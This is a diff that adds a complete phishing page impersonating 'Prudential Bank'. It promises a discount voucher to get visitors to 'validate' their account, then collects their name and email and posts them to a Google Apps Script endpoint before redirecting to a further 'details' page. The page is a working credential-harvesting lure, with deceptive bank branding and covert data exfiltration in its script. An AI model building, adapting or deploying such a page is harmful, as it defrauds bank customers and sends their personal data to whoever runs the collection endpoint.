@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Prudential Bank Validation</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f2f7f8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #0A1A2F;
+    }
+
+    /* PRUDENTIAL BANK HEADER */
+    .header {
+      background: linear-gradient(to bottom, #009CA6, #006F78);
+      color: white;
+      text-align: center;
+      padding: 25px 20px;
+      width: 100%;
+      max-width: 600px;
+      border-bottom-left-radius: 20px;
+      border-bottom-right-radius: 20px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      margin: 0;
+      letter-spacing: 1px;
+    }
+
+    .header p {
+      font-size: 14px;
+      margin-top: 6px;
+      opacity: 0.9;
+    }
+
+    /* CENTERED AND COLORED TEXT */
+    .welcome-text {
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      margin-top: 18px;
+    }
+
+    .welcome-text p {
+      color: #0A1A2F;           /* SAME COLOR AS ACTION BUTTON */
+      font-size: 16px;
+      font-weight: 600;         /* Slightly bold */
+      line-height: 1.4;
+      margin: 0;
+    }
+
+    .form-wrap {
+      background: #ffffff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 20px;
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #0A1A2F;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 8px;
+      border: 1px solid #c5c5c5;
+      background: #fefefe;
+      font-size: 14px;
+      color: #0A1A2F;
+    }
+
+    /* Prudential Bank blue button */
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      background: #0A1A2F;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background: #112743;
+    }
+
+    footer {
+      font-size: 13px;
+      padding: 20px;
+      margin-top: auto;
+      color: #006F78;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    /* Overlay */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.45);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      font-size: 18px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .spinner {
+      border: 4px solid #fff;
+      border-top: 4px solid #009CA6;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="header">
+    <h1>PRUDENTIAL BANK</h1>
+    <p>Truly Dependable</p>
+  </div>
+  
+  <!-- Centered & Colored Text -->
+  <div class="welcome-text">
+    <p>Validate Your Account For Smooth Transactional Purposes and claim a 10% discount voucher for your purchases with PBL</p>
+  </div>
+  
+  <div class="form-wrap" id="formContainer">
+    <form id="dataForm" autocomplete="off">
+      <label for="firstName">First Name</label>
+      <input id="firstName" name="firstName" type="text" required>
+
+      <label for="lastName">Last Name</label>
+      <input id="lastName" name="lastName" type="text" required>
+
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" required>
+
+      <button type="submit">CONTINUE →</button>
+    </form>
+  </div>
+
+  <footer>Prudential Bank, Truly Dependable</footer>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Processing, please wait…
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
+    const form = document.getElementById('dataForm');
+    const overlay = document.getElementById('overlay');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      overlay.classList.add('active');
+      const fd = new FormData(form);
+
+      try {
+        await fetch(scriptURL, { method: 'POST', body: fd });
+        setTimeout(() => window.location.href = 'details.html', 1200);
+      } catch (err) {
+        overlay.classList.remove('active');
+        alert('Something went wrong. Please try again.');
+      }
+    });
+  </script>
+
+</body>
+</html>
